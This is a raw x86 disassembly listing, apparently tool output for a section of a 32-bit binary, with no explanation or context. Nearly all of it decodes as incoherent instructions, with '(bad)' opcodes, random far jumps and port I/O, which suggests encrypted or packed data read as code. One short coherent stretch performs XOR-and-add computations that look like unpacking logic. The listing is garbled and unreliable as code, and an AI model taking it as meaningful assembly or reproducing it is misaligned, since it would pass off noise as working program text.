  40f9da:	mov    ds:0xa434450b,eax
  40f9df:	push   ecx
  40f9e0:	pusha  
  40f9e1:	rol    DWORD PTR [edx-0x9],0x5c
  40f9e5:	out    dx,eax
  40f9e6:	test   al,dl
  40f9e8:	pop    ebp
  40f9e9:	js     0x40f9dc
  40f9eb:	adc    eax,0x24592dae
  40f9f0:	sbb    ah,BYTE PTR [eax+0x4c95ae81]
  40f9f6:	js     0x40f9f8
  40f9f8:	sub    bh,dh
  40f9fa:	js     0x40fa0e
  40f9fc:	sbb    bh,ah
  40f9fe:	mov    ebp,0xe62d239a
  40fa03:	jecxz  0x40fa4f
  40fa05:	jns    0x40f9ed
  40fa07:	retf   
  40fa08:	jne    0x40f9bd
  40fa0a:	add    cl,dh
  40fa0c:	sti    
  40fa0d:	inc    esp
  40fa0e:	push   ecx
  40fa0f:	jo     0x40f9a3
  40fa11:	adc    eax,0xb893e053
  40fa16:	in     al,0x43
  40fa18:	sbb    cl,BYTE PTR gs:[edi]
  40fa1b:	loopne 0x40fa60
  40fa1d:	mov    ds:0x62b63df6,eax
  40fa22:	mov    bl,0xb9
  40fa24:	push   ebx
  40fa25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa26:	pop    esp
  40fa27:	lds    ebp,FWORD PTR [edx]
  40fa29:	test   BYTE PTR [ecx+eiz*2-0x9b7e99a],bl
  40fa30:	and    eax,0x6bc2fc79
  40fa35:	add    DWORD PTR [ecx],edx
  40fa37:	jg     0x40fa70
  40fa39:	sub    bl,dh
  40fa3b:	inc    ebp
  40fa3c:	das    
  40fa3d:	sar    DWORD PTR [ebx+0x1cc28d6f],1
  40fa43:	imul   ecx,ebx,0x3d853c15
  40fa49:	or     DWORD PTR [edi+0xe],esi
  40fa4c:	sub    BYTE PTR [eax-0x7cef6c55],0x21
  40fa53:	and    dh,BYTE PTR [ebp+0x70]
  40fa56:	aad    0x35
  40fa58:	out    dx,eax
  40fa59:	xor    bh,bh
  40fa5b:	cmp    al,0xd9
  40fa5d:	add    DWORD PTR [esi-0x10],ecx
  40fa60:	adc    ch,dl
  40fa62:	(bad)  [edx-0x68]
  40fa65:	enter  0xd0a4,0xfb
  40fa69:	adc    DWORD PTR [ebx-0x6fe2b54f],esp
  40fa6f:	ss popf 
  40fa71:	push   edi
  40fa72:	les    eax,FWORD PTR [esi]
  40fa74:	retf   
  40fa75:	xor    BYTE PTR [eax+ebp*8-0x400704b8],0x1a
  40fa7d:	rol    DWORD PTR gs:[ecx+0x69136b2d],0xae
  40fa85:	out    dx,al
  40fa86:	mov    ecx,0x4e0d16fc
  40fa8b:	xor    BYTE PTR [esi],ah
  40fa8d:	or     ebx,DWORD PTR [edx+eiz*1]
  40fa90:	scas   al,BYTE PTR es:[edi]
  40fa91:	stc    
  40fa92:	ins    BYTE PTR es:[edi],dx
  40fa93:	pop    ds
  40fa94:	repz sahf 
  40fa96:	cmp    eax,0x68897ca6
  40fa9b:	daa    
  40fa9c:	inc    esi
  40fa9d:	out    dx,eax
  40fa9e:	mov    dh,0x72
  40faa0:	in     eax,0xbe
  40faa2:	xchg   ecx,eax
  40faa3:	and    BYTE PTR [edi-0x31970c5c],0x9
  40faaa:	push   esi
  40faab:	cwde   
  40faac:	bound  eax,QWORD PTR [ebx]
  40faae:	xor    BYTE PTR [edi-0x46],0xc
  40fab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fab3:	aaa    
  40fab4:	mov    cl,0xe0
  40fab6:	xor    eax,0x18b1349c
  40fabb:	das    
  40fabc:	test   ch,cl
  40fabe:	je     0x40faba
  40fac0:	push   0x9ae7bff5
  40fac5:	dec    edx
  40fac6:	xchg   edx,eax
  40fac7:	xchg   edx,eax
  40fac8:	mov    DWORD PTR [esi+eax*2+0x11d14bf4],0xe0cdf265
  40fad3:	les    esi,FWORD PTR ds:0xcdddcac7
  40fad9:	jns    0x40fa71
  40fadb:	lock xor BYTE PTR [edi],bh
  40fade:	add    al,0x74
  40fae0:	mov    BYTE PTR [esi-0x1769e306],ch
  40fae6:	ins    BYTE PTR es:[edi],dx
  40fae7:	add    eax,0x519b326e
  40faec:	xor    DWORD PTR [ebx-0x7c70b0f7],esp
  40faf2:	repz jmp 0x24b42ce3
  40faf8:	push   ecx
  40faf9:	jbe    0x40fb47
  40fafb:	es cmp cl,ch
  40fafe:	xor    esi,DWORD PTR [ebx-0x1e194cf2]
  40fb04:	cld    
  40fb05:	mov    ds:0x3f004b0d,al
  40fb0a:	loop   0x40fb7c
  40fb0c:	and    DWORD PTR [edx+edi*1],eax
  40fb0f:	js     0x40fb6c
  40fb11:	push   ds
  40fb12:	int    0x65
  40fb14:	sub    DWORD PTR [ebx],0x49
  40fb17:	inc    ebx
  40fb18:	mov    BYTE PTR [ebp-0x77],dl
  40fb1b:	std    
  40fb1c:	test   BYTE PTR [edx+0x56549559],al
  40fb22:	ror    BYTE PTR [eax+0x7e0a93d6],0x24
  40fb29:	cmp    BYTE PTR [edi+0x34e4e1e0],0xba
  40fb30:	jno    0x40fb43
  40fb32:	fidivr WORD PTR [ebp+esi*8-0x3b93ec2a]
  40fb39:	inc    esi
  40fb3a:	cli    
  40fb3b:	mov    esi,0x7137b94a
  40fb40:	add    ah,ah
  40fb42:	test   BYTE PTR [esi-0x59257bb7],ch
  40fb48:	mov    ecx,0x8a1c7850
  40fb4d:	outs   dx,DWORD PTR ds:[esi]
  40fb4e:	outs   dx,BYTE PTR ds:[esi]
  40fb4f:	test   DWORD PTR fs:[esi+0x12],0xc5215f55
  40fb57:	ins    BYTE PTR es:[edi],dx
  40fb58:	and    eax,0x636c985a
  40fb5d:	mov    ah,0x31
  40fb5f:	sub    BYTE PTR [esi+0x78f003ed],bh
  40fb65:	fbstp  TBYTE PTR gs:[edx*4-0x329b350b]
  40fb6d:	xchg   ecx,eax
  40fb6e:	lods   eax,DWORD PTR ds:[esi]
  40fb6f:	pop    ds
  40fb70:	in     al,dx
  40fb71:	ror    dl,1
  40fb73:	aad    0xf4
  40fb75:	adc    ah,bh
  40fb77:	xor    eax,0x8cbe3e3b
  40fb7c:	gs loopne 0x40fb6e
  40fb7f:	xor    DWORD PTR [edx+0xec67518],esp
  40fb85:	mov    esp,0x133f7887
  40fb8a:	inc    ebx
  40fb8b:	dec    ebx
  40fb8c:	push   edi
  40fb8d:	mov    ebx,0x7a984cce
  40fb92:	rol    bl,1
  40fb94:	js     0x40fb73
  40fb96:	test   BYTE PTR [ecx+0x392d9191],dh
  40fb9c:	int    0xcb
  40fb9e:	das    
  40fb9f:	mov    edx,0x210ba708
  40fba4:	mov    bh,BYTE PTR [edx+0x75]
  40fba7:	pop    ecx
  40fba8:	jb     0x40fbbf
  40fbaa:	out    0xad,eax
  40fbac:	pop    ebp
  40fbad:	mov    bl,0x6a
  40fbaf:	xchg   ebp,eax
  40fbb0:	sbb    DWORD PTR [ecx],ebx
  40fbb2:	pop    eax
  40fbb3:	or     ch,BYTE PTR [ecx+ecx*1-0x79b866f7]
  40fbba:	hlt    
  40fbbb:	jno    0x40fbb9
  40fbbd:	push   cs
  40fbbe:	out    0xac,eax
  40fbc0:	xor    al,0xb8
  40fbc2:	jp     0x40fbc1
  40fbc4:	fdivr  QWORD PTR [ebp+esi*4-0x3b]
  40fbc8:	xor    esi,DWORD PTR [ecx]
  40fbca:	jbe    0x40fbf1
  40fbcc:	pusha  
  40fbcd:	mov    WORD PTR [ebp+0x4e93f547],?
  40fbd3:	nop    DWORD PTR [ecx-0xe9ee2b8]
  40fbda:	jne    0x40fbb5
  40fbdc:	mov    cl,0x64
  40fbde:	mov    esi,0xd355a0ac
  40fbe3:	jnp    0x40fbcf
  40fbe5:	sub    ecx,DWORD PTR [ecx-0x9ebd079]
  40fbeb:	mov    ecx,0xed0c19d7
  40fbf0:	mov    ebp,0x82f616b
  40fbf5:	cmp    eax,0xfa31b982
  40fbfa:	mov    bl,ah
  40fbfc:	dec    ebx
  40fbfd:	mov    ecx,0xdae95750
  40fc02:	or     BYTE PTR [edi],ch
  40fc04:	cmc    
  40fc05:	jp     0x40fc7a
  40fc07:	pop    edi
  40fc08:	(bad)  
  40fc09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc0a:	popa   
  40fc0b:	push   eax
  40fc0c:	mov    cl,0xc2
  40fc0e:	rol    BYTE PTR [ebp-0x3000b0d2],cl
  40fc14:	pusha  
  40fc15:	sub    DWORD PTR [edx-0x445e92ba],edi
  40fc1b:	adc    DWORD PTR [ecx+0x41],0xffffff98
  40fc1f:	mov    dl,0xd3
  40fc21:	(bad)  
  40fc22:	xchg   esp,eax
  40fc23:	scas   al,BYTE PTR es:[edi]
  40fc24:	or     bl,BYTE PTR [eax]
  40fc26:	jl     0x40fc05
  40fc28:	repnz rcr BYTE PTR gs:[edx-0xf],1
  40fc2d:	mov    dl,0x31
  40fc2f:	xor    ecx,DWORD PTR [ebp-0x7912da72]
  40fc35:	mov    esp,0x601ad42d
  40fc3a:	fnstcw WORD PTR [ebp+0x1ac1e2ab]
  40fc40:	dec    esp
  40fc41:	add    edx,DWORD PTR ds:0x1612c7d5
  40fc47:	into   
  40fc48:	cmp    BYTE PTR [esi+0xfaad354],bl
  40fc4e:	or     al,BYTE PTR [ebp-0x7fc9e8ed]
  40fc54:	sub    BYTE PTR [ecx+0x2eca5944],ah
  40fc5a:	jnp    0x40fc24
  40fc5c:	les    edi,FWORD PTR [edi+ebp*2+0x1e]
  40fc60:	addr16 out dx,eax
  40fc62:	jg     0x40fcc2
  40fc64:	ins    BYTE PTR es:[edi],dx
  40fc65:	stos   DWORD PTR es:[edi],eax
  40fc66:	mov    al,0x92
  40fc68:	mov    ebp,0xf147bb07
  40fc6d:	and    al,BYTE PTR [ebx-0x33]
  40fc70:	mov    edi,0x79b2b3dd
  40fc75:	out    dx,eax
  40fc76:	mov    ebp,edx
  40fc78:	popa   
  40fc79:	or     edx,DWORD PTR [ebx-0x1b0ce332]
  40fc7f:	adc    al,0xe1
  40fc81:	out    0xaf,al
  40fc83:	push   edx
  40fc84:	cmp    al,0xac
  40fc86:	mov    WORD PTR [esi-0x17],cs
  40fc89:	mov    ah,0x7e
  40fc8b:	mov    esp,0xc7e1e043
  40fc90:	out    dx,al
  40fc91:	es pop ebx
  40fc93:	mov    dh,0x50
  40fc95:	adc    al,BYTE PTR [ecx]
  40fc97:	or     ebp,edx
  40fc99:	add    ah,ch
  40fc9b:	scas   al,BYTE PTR es:[edi]
  40fc9c:	cmp    al,0x9e
  40fc9e:	fsub   DWORD PTR [edi+0x1e]
  40fca1:	in     eax,0xc9
  40fca3:	push   esp
  40fca4:	popf   
  40fca5:	adc    ecx,DWORD PTR [eax-0x3ca83c06]
  40fcab:	cmp    DWORD PTR [edi-0x3a63d69d],0xe5e78ad7
  40fcb5:	scas   eax,DWORD PTR es:[edi]
  40fcb6:	sti    
  40fcb7:	push   eax
  40fcb8:	test   eax,0x918ec8a4
  40fcbd:	cs nop
  40fcbf:	or     ebx,ebx
  40fcc1:	pop    ebp
  40fcc2:	and    cl,BYTE PTR [edx]
  40fcc4:	test   eax,0x368092b2
  40fcc9:	cmp    al,BYTE PTR [ebx]
  40fccb:	cmp    dl,BYTE PTR [eax-0x1f]
  40fcce:	fbstp  TBYTE PTR [ebp-0x540844e5]
  40fcd4:	scas   al,BYTE PTR es:[edi]
  40fcd5:	es out 0x8c,eax
  40fcd8:	pop    esp
  40fcd9:	cmp    ebp,ecx
  40fcdb:	push   ds
  40fcdc:	mov    BYTE PTR [esp+edx*2+0x45],bh
  40fce0:	into   
  40fce1:	test   al,0xe7
  40fce3:	push   esp
  40fce4:	pop    ds
  40fce5:	push   ds
  40fce6:	xchg   esp,eax
  40fce7:	cs xchg ebx,eax
  40fce9:	push   ebp
  40fcea:	repnz out dx,al
  40fcec:	xchg   ebx,eax
  40fced:	push   edx
  40fcee:	jmp    0x40fd1c
  40fcf0:	xchg   ebx,eax
  40fcf1:	aad    0x1a
  40fcf3:	scas   eax,DWORD PTR es:[edi]
  40fcf4:	ins    DWORD PTR es:[edi],dx
  40fcf5:	je     0x40fcf9
  40fcf7:	outs   dx,DWORD PTR ds:[esi]
  40fcf8:	cmp    al,BYTE PTR [edx+0x6c42e1bb]
  40fcfe:	jmp    0xa0c9:0xe60bc5e0
  40fd05:	mov    eax,0xb637a52d
  40fd0a:	mov    ds,WORD PTR [esi]
  40fd0c:	push   ds
  40fd0d:	and    dl,ah
  40fd0f:	outs   dx,BYTE PTR ds:[esi]
  40fd10:	rcr    DWORD PTR [eax],cl
  40fd12:	int3   
  40fd13:	sub    esi,DWORD PTR [ecx+0x7e43db7e]
  40fd19:	arpl   bp,bx
  40fd1b:	int3   
  40fd1c:	test   eax,0xc7f8ec45
  40fd21:	sub    esi,DWORD PTR [edx-0x42]
  40fd24:	xchg   edi,eax
  40fd25:	jmp    0x40fd4a
  40fd27:	xchg   DWORD PTR [eax-0x19df5fa2],edx
  40fd2d:	and    esi,DWORD PTR [ebp+0x8]
  40fd30:	jbe    0x40fcd1
  40fd32:	ds inc si
  40fd35:	pop    ss
  40fd36:	loopne 0x40fd76
  40fd38:	jae    0x40fce6
  40fd3a:	test   eax,0xc4ae8
  40fd3f:	add    BYTE PTR [ebx+0x414afe0d],cl
  40fd45:	add    BYTE PTR [ebx+0x1cc89],cl
  40fd4b:	add    BYTE PTR [ecx-0x7ba74ff],cl
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	retf   
  40fd9d:	push   eax
  40fd9e:	jbe    0x40fd50
  40fda0:	cmp    BYTE PTR [eax+0x79f47e7e],0x7e
  40fda7:	jle    0x40fd9e
  40fda9:	add    al,0x5b
  40fdab:	mov    ah,bl
  40fdad:	test   eax,0xb7086bb2
  40fdb2:	popf   
  40fdb3:	stc    
  40fdb4:	and    ah,BYTE PTR [eax]
  40fdb6:	push   esp
  40fdb7:	repnz xchg esp,eax
  40fdb9:	mov    ebx,gs
  40fdbb:	sbb    esi,DWORD PTR [ecx-0x204541a4]
  40fdc1:	mov    cl,0x71
  40fdc3:	mov    bh,0xb8
  40fdc5:	stos   DWORD PTR es:[edi],eax
  40fdc6:	into   
  40fdc7:	mov    ds:0x638fc705,eax
  40fdcc:	inc    BYTE PTR [ecx-0x5c]
  40fdcf:	pop    ecx
  40fdd0:	cmp    BYTE PTR [edi],bl
  40fdd2:	adc    BYTE PTR [ebx+eax*1+0x5],bh
  40fdd6:	(bad)  
  40fdd8:	sbb    bh,BYTE PTR [ebx*1-0x7c292abe]
  40fddf:	shl    DWORD PTR [ebp+edi*1+0x2c],0xc0
  40fde4:	add    DWORD PTR [esi],ebx
  40fde6:	cdq    
  40fde7:	cdq    
  40fde8:	pop    es
  40fde9:	lahf   
  40fdea:	in     eax,0x78
  40fdec:	aas    
  40fded:	and    eax,0xbe3433ea
  40fdf2:	mov    ecx,0xdfba78e8
  40fdf7:	scas   al,BYTE PTR es:[edi]
  40fdf8:	mov    dh,0xbf
  40fdfa:	shl    BYTE PTR [esi-0x5c],0x89
  40fdfe:	mov    eax,ds:0xe7833373
  40fe03:	retf   0x3cfc
  40fe06:	das    
  40fe07:	aad    0xb4
  40fe09:	mov    DWORD PTR [edx+0x6b],esi
  40fe0c:	inc    ax
  40fe0e:	add    eax,0xa34c7bea
  40fe13:	bound  edi,QWORD PTR [ecx+0x7d]
  40fe16:	ins    BYTE PTR es:[edi],dx
  40fe17:	jecxz  0x40fe02
  40fe19:	shr    ebp,0x19
  40fe1c:	jae    0x40fe1d
  40fe1e:	cli    
  40fe1f:	jno    0x40fe76
  40fe21:	addr16 fcmovb st,st(5)
  40fe24:	(bad)  
  40fe25:	rol    cl,cl
  40fe27:	pop    esp
  40fe28:	(bad)  
  40fe29:	imul   eax,eax,0x17644892
  40fe2f:	mov    WORD PTR [ebp-0x6],cs
  40fe32:	scas   eax,DWORD PTR es:[edi]
  40fe33:	les    edi,FWORD PTR [esi]
  40fe35:	pushf  
  40fe36:	hlt    
  40fe37:	mov    ds:0x350d6f1,eax
  40fe3c:	mov    ebx,0x85e2c820
  40fe41:	in     eax,dx
  40fe42:	iret   
  40fe43:	pop    eax
  40fe44:	xor    eax,0x2cc1fe99
  40fe49:	sub    edi,DWORD PTR [ecx]
  40fe4b:	pop    ebx
  40fe4c:	mov    esi,0x2239b124
  40fe51:	ds cmc 
  40fe53:	fsub   DWORD PTR [ecx]
  40fe55:	clc    
  40fe56:	out    dx,eax
  40fe57:	je     0x40fe9d
  40fe59:	popf   
  40fe5a:	bound  eax,QWORD PTR [ecx]
  40fe5c:	ret    
  40fe5d:	arpl   ax,bx
  40fe5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe60:	jnp    0x40feaa
  40fe62:	push   es
  40fe63:	push   eax
  40fe64:	adc    al,0xd2
  40fe66:	and    eax,0x4fe473c4
  40fe6b:	hlt    
  40fe6c:	and    al,0xb
  40fe6e:	adc    ah,bh
  40fe70:	xor    ah,BYTE PTR [eax-0x2c]
  40fe73:	add    eax,0x6ccf5a68
  40fe78:	out    0x76,eax
  40fe7a:	mov    esi,0x6423feb
  40fe7f:	xor    edi,esi
  40fe81:	jns    0x40fee8
  40fe83:	rcl    bh,1
  40fe85:	lods   al,BYTE PTR ds:[esi]
  40fe86:	jle    0x40fe09
  40fe88:	retf   0x64c2
  40fe8b:	idiv   BYTE PTR [edi+0x5372893b]
  40fe91:	mov    edi,0x876d5293
  40fe96:	jecxz  0x40fe75
  40fe98:	mov    al,BYTE PTR [ebp+0x1fae1463]
  40fe9e:	ins    DWORD PTR es:[edi],dx
  40fe9f:	dec    ecx
  40fea0:	jmp    0xfb0a08b9
  40fea5:	jo     0x40ff1d
  40fea7:	sub    edx,DWORD PTR [eax-0x299fa324]
  40fead:	xor    edi,ebp
  40feaf:	stos   DWORD PTR es:[edi],eax
  40feb0:	les    esi,FWORD PTR [ecx+edi*1-0x7f432a2f]
  40feb7:	loope  0x40fe4a
  40feb9:	jae    0x40fe50
  40febb:	sti    
  40febc:	pop    es
  40febd:	jg     0x40feb2
  40febf:	push   esp
  40fec0:	cmp    dl,BYTE PTR [eax+0x5a9989bd]
  40fec6:	fcom   DWORD PTR [edi+0x69bb5d30]
  40fecc:	sbb    al,0x8b
  40fece:	mov    edx,0x2bdbe8b5
  40fed3:	push   ebx
  40fed4:	test   BYTE PTR [ebx+0x5e106f0c],dh
  40feda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fedb:	dec    edx
  40fedc:	ror    BYTE PTR [edx],cl
  40fede:	adc    BYTE PTR ds:0xc5b0eaa8,0xfb
  40fee5:	shl    BYTE PTR [eax],1
  40fee7:	sbb    esp,ebp
  40fee9:	sub    ecx,DWORD PTR [eax+eax*1]
  40feec:	mov    dl,0xe2
  40feee:	sete   BYTE PTR [esi+0x126e2062]
  40fef5:	jle    0x40feda
  40fef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef8:	outs   dx,DWORD PTR ds:[esi]
  40fef9:	jb     0x40ff79
  40fefb:	push   edi
  40fefc:	dec    esi
  40fefd:	popa   
  40fefe:	mov    ch,0x8b
  40ff00:	lods   eax,DWORD PTR ds:[esi]
  40ff01:	mov    ecx,0x4db594b9
  40ff06:	mov    ds:0x90ecd389,al
  40ff0b:	mov    bl,0x7a
  40ff0d:	sub    al,0x5f
  40ff0f:	add    al,0xaf
  40ff11:	cmc    
  40ff12:	call   0x775f:0x87c22998
  40ff19:	xor    al,dh
  40ff1b:	ret    0xe4f7
  40ff1e:	aaa    
  40ff1f:	retf   0xd399
  40ff22:	xor    bl,cl
  40ff24:	cs fwait
  40ff26:	out    0x16,al
  40ff28:	clc    
  40ff29:	cmp    eax,0x20b494e4
  40ff2e:	aas    
  40ff2f:	dec    ebp
  40ff30:	add    al,ch
  40ff32:	inc    BYTE PTR [ebp-0x243bf63d]
  40ff38:	cwde   
  40ff39:	jmp    0xacc:0x49e3afb7
  40ff40:	xor    al,0xb1
  40ff42:	js     0x40ff5b
  40ff44:	icebp  
  40ff45:	mov    ds:0xe9866688,eax
  40ff4a:	xor    eax,0x7cd9d42a
  40ff4f:	jae    0x40ffa1
  40ff51:	pop    ebx
  40ff52:	ins    BYTE PTR es:[edi],dx
  40ff53:	out    0xd2,al
  40ff55:	ret    
  40ff56:	outs   dx,DWORD PTR ds:[esi]
  40ff57:	ror    DWORD PTR [ebx+ebx*2+0x68],0x91
  40ff5c:	(bad)  
  40ff5d:	xor    eax,DWORD PTR [eax]
  40ff5f:	jnp    0x40ff31
  40ff61:	sub    ch,dl
  40ff63:	push   eax
  40ff64:	in     eax,0xca
  40ff66:	leave  
  40ff67:	inc    eax
  40ff68:	jle    0x40ff96
  40ff6a:	sbb    DWORD PTR [ecx-0x50352db5],ebx
  40ff70:	(bad)  
  40ff71:	jnp    0x40fff2
  40ff73:	push   0x6a3f9d9e
  40ff78:	mov    ah,0xdb
  40ff7a:	lock fldenv [edi+ebp*4]
  40ff7e:	lahf   
  40ff7f:	in     eax,0x45
  40ff81:	sbb    BYTE PTR [eax+0x40],bh
  40ff84:	cld    
  40ff85:	mov    DWORD PTR [eax],ebp
  40ff87:	dec    BYTE PTR [ebx+ecx*2-0x1d]
  40ff8b:	inc    ecx
  40ff8c:	or     bh,BYTE PTR [ecx]
  40ff8e:	out    dx,eax
  40ff8f:	cmp    dh,BYTE PTR [ebx+0x6683e38c]
  40ff95:	cmp    bl,0xea
  40ff98:	out    dx,al
  40ff99:	data16 std 
  40ff9b:	pop    esi
  40ff9c:	mov    dl,0x50
  40ff9e:	jle    0x40ffd2
  40ffa0:	stos   DWORD PTR es:[edi],eax
  40ffa1:	push   edx
  40ffa2:	push   ecx
  40ffa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffa4:	xchg   ebx,eax
  40ffa5:	rcl    DWORD PTR [edi-0x5299eea0],0x2
  40ffac:	pusha  
  40ffad:	imul   DWORD PTR [ecx+esi*1-0xf]
  40ffb1:	rol    DWORD PTR [esi],0x38
  40ffb4:	jbe    0x40ff8b
  40ffb6:	dec    esp
  40ffb7:	push   0x37
  40ffb9:	repz retf 
  40ffbb:	add    al,0xe0
  40ffbd:	ret    0x67b5
  40ffc0:	jl     0x40ffd4
  40ffc2:	std    
  40ffc3:	js     0x40ffe9
  40ffc5:	sbb    ch,BYTE PTR [edi]
  40ffc7:	push   0x42
  40ffc9:	jns    0x40ffe6
  40ffcb:	inc    DWORD PTR [esi+ebx*4+0x2f]
  40ffcf:	fmul   st,st(4)
  40ffd1:	xchg   esp,eax
  40ffd2:	scas   eax,DWORD PTR es:[edi]
  40ffd3:	pop    ecx
  40ffd4:	ins    DWORD PTR es:[edi],dx
  40ffd5:	add    BYTE PTR [edx-0x76db878d],ah
  40ffdb:	or     eax,0x9a0e0ca5
  40ffe0:	loopne 0x40ffb3
  40ffe2:	sub    edx,DWORD PTR [edi]
  40ffe4:	mov    esp,0xa34cd87c
  40ffe9:	push   edx
  40ffea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffeb:	outs   dx,DWORD PTR ds:[esi]
  40ffec:	nop
  40ffed:	push   0xd03eb5b8
  40fff2:	daa    
  40fff3:	jbe    0x410046
  40fff5:	jne    0x40ffaa
  40fff7:	test   al,cl
  40fff9:	and    al,0x42
  40fffb:	dec    ebp
  40fffc:	paddusb mm4,mm1
  40ffff:	loop   0x410079
  410001:	ja     0x40ff83
  410003:	push   eax
  410004:	iret   
  410005:	mov    bh,BYTE PTR [ecx+0x5e540d68]
  41000b:	jo     0x410089
  41000d:	les    ecx,FWORD PTR [eax+ecx*4+0x439a49b0]
  410014:	enter  0x4b9d,0x74
  410018:	aas    
  410019:	nop
  41001a:	aam    0x1a
  41001c:	pusha  
  41001d:	jp     0x410008
  41001f:	loope  0x410047
  410021:	in     al,dx
  410022:	jne    0x40ffe0
  410024:	lahf   
  410025:	(bad)  
  410026:	mov    eax,0x9b2460e2
  41002b:	retf   0x1301
  41002e:	jo     0x41007b
  410030:	pop    ds
  410031:	sub    edx,DWORD PTR [ecx]
  410033:	push   cs
  410034:	cld    
  410035:	stc    
  410036:	nop
  410037:	popa   
  410038:	fadd   DWORD PTR [eax-0x52af7778]
  41003e:	mov    WORD PTR [edx-0x28],ds
  410041:	fst    st(1)
  410043:	into   
  410044:	fwait
  410045:	jmp    0x40ffc7
  410047:	mov    bh,0xa4
  410049:	pop    ds
  41004a:	push   cs
  41004b:	(bad)  [edx]
  41004d:	sub    DWORD PTR [ebx+0x1a8ea7a9],edi
  410053:	icebp  
  410054:	jg     0x4100c3
  410056:	xor    BYTE PTR [esi+0xd],dl
  410059:	ss add al,0xe
  41005c:	fisubr WORD PTR [eax]
  41005e:	addr16 retf 
  410060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410061:	and    eax,0x7df9c5c
  410066:	mov    al,0x60
  410068:	push   eax
  410069:	inc    edx
  41006a:	push   esi
  41006b:	(bad)  
  41006d:	adc    ah,dl
  41006f:	mov    dh,0x71
  410071:	push   ebx
  410072:	shl    BYTE PTR [ecx+0x4e],1
  410075:	les    ebx,FWORD PTR ds:0xac561ec8
  41007b:	sbb    bh,ah
  41007d:	leave  
  41007e:	jle    0x4100d2
  410080:	(bad)  
  410081:	out    dx,eax
  410082:	popf   
  410083:	cmp    esp,eax
  410085:	sub    DWORD PTR [ebx+0x7e],esp
  410088:	int    0x45
  41008a:	dec    esi
  41008b:	adc    cl,al
  41008d:	mov    WORD PTR [edi],fs
  41008f:	mov    al,ds:0x1b7d16ef
  410094:	(bad)  
  410095:	clc    
  410096:	sbb    BYTE PTR [ecx-0x2c],bh
  410099:	jge    0x410086
  41009b:	add    al,dh
  41009d:	jnp    0x410044
  41009f:	cmp    al,0x15
  4100a1:	popa   
  4100a2:	push   es
  4100a3:	or     eax,0xec3f179a
  4100a8:	mov    edi,DWORD PTR [ebx+0x1d]
  4100ab:	sbb    eax,0xe268f0df
  4100b0:	idiv   DWORD PTR [eax+0x49da2b65]
  4100b6:	gs xchg esp,eax
  4100b8:	inc    ebp
  4100b9:	xor    BYTE PTR [eax],bh
  4100bb:	scas   eax,DWORD PTR es:[edi]
  4100bc:	xchg   esi,eax
  4100bd:	dec    esi
  4100be:	jecxz  0x4100a8
  4100c0:	adc    DWORD PTR [ebx+0x2fdf0123],edi
  4100c6:	cmp    eax,DWORD PTR [ebx]
  4100c8:	dec    esp
  4100c9:	push   0x36
  4100cb:	dec    esp
  4100cc:	cmp    al,0x7f
  4100ce:	out    0x1b,eax
  4100d0:	(bad)  
  4100d1:	(bad)  
  4100d2:	repnz xlat BYTE PTR ds:[ebx]
  4100d4:	(bad)  
  4100d5:	int3   
  4100d6:	and    edi,DWORD PTR [edx-0x35]
  4100d9:	xor    eax,0xb1751f7a
  4100de:	push   ecx
  4100df:	or     BYTE PTR [ecx],0x34
  4100e2:	sbb    BYTE PTR [eax-0x6af73217],0xeb
  4100e9:	shr    DWORD PTR [ebp-0x30],1
  4100ec:	cdq    
  4100ed:	push   cs
  4100ee:	jbe    0x4100ec
  4100f0:	sub    DWORD PTR [esi],0x19d595d2
  4100f6:	dec    ecx
  4100f7:	shr    DWORD PTR [ecx+0x73],0x2d
  4100fb:	inc    edx
  4100fc:	jle    0x410167
  4100fe:	lock jbe 0x41015b
  410101:	mov    gs,WORD PTR [eax-0x28]
  410104:	push   edx
  410105:	call   0x6f1bc7a2
  41010a:	mov    esi,0x18f8fdab
  41010f:	in     eax,dx
  410110:	and    al,0xde
  410112:	sub    eax,eax
  410114:	xor    DWORD PTR [ebp+0x0],edx
  410117:	mov    ebx,0xa1b4e726
  41011c:	into   
  41011d:	mov    eax,ds:0x33fc458b
  410122:	(bad)  
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    DWORD PTR [ecx],edi
  410136:	and    eax,0x4478cdf3
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x4101a4
  410142:	adc    al,0x7f
  410144:	xchg   ecx,eax
  410145:	pop    esi
  410146:	je     0x41010e
  410148:	fmulp  st(5),st
  41014a:	(bad)  
  41014b:	adc    BYTE PTR [edx],bl
  41014d:	call   DWORD PTR [ebp-0x5b]
  410150:	xchg   esp,eax
  410151:	inc    ecx
  410152:	imul   edx,DWORD PTR [ebp-0x2e],0x2892b776
  410159:	lods   eax,DWORD PTR ds:[esi]
  41015a:	in     al,0x3b
  41015c:	inc    edi
  41015d:	enter  0xe9b0,0x85
  410161:	add    dh,ah
  410163:	xchg   ecx,eax
  410164:	out    0x9f,al
